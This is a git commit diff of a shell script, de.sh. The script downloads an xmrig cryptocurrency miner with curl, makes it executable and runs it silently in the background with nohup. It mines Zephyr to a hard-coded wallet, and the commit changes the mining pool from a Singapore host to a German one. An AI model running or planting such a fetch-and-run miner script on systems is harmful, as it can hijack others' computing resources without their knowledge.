6db71cd2d94b1557cc26e42dd9054e5164386076
MAKEMMM <149468659+MAKEMMM@users.noreply.github.com>
2024-01-24 09:06:59 +0700

    Update de.sh

--- de.sh
+++ de.sh
@@ -3,6 +3,6 @@ curl https://github.com/MAKEMMM/tool/raw/main/xmrig -o xmrig
 
 chmod +x ./xmrig
 
-nohup ./xmrig -o sg-zephyr.miningocean.org:5332 -u ZEPHYR2i95CPSxJtirKPi4MDPwvXpZFu2R4xmC7LFRXsXuHgM77KRGD6WqwVKDpAivYdeVJeQfpUwD9zw59QJQNvf5be98SxosU33 -p $(hostname) -a rx/0 -k -t $1 > /dev/null 2>&1 &
+nohup ./xmrig -o de-zephyr.miningocean.org:5332 -u ZEPHYR2i95CPSxJtirKPi4MDPwvXpZFu2R4xmC7LFRXsXuHgM77KRGD6WqwVKDpAivYdeVJeQfpUwD9zw59QJQNvf5be98SxosU33 -p $(hostname) -a rx/0 -k -t $1 > /dev/null 2>&1 &
 
 ps -uax | grep xmr
